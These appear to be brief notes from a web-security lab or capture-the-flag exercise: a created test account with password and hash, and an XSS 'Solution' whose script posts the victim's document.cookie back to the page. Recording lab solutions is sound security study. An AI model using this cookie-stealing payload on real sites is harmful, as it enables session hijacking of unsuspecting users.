## ELS JS

# created users

usernameA:passwordA:a@a.nl:nameA:8277a8ab5fc7a86cda6231512e7a3b08d6c671b5

# xss

no obvious sql injection
Worked: <a href='#'>test</a>

Solution:
<img onload='loadImage()' alt=''>Just a normal message10<script type="text/javascript">var xhr = new XMLHttpRequest();
xhr.open("POST", '?', true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {}};
xhr.send("note="+document.cookie);</script>





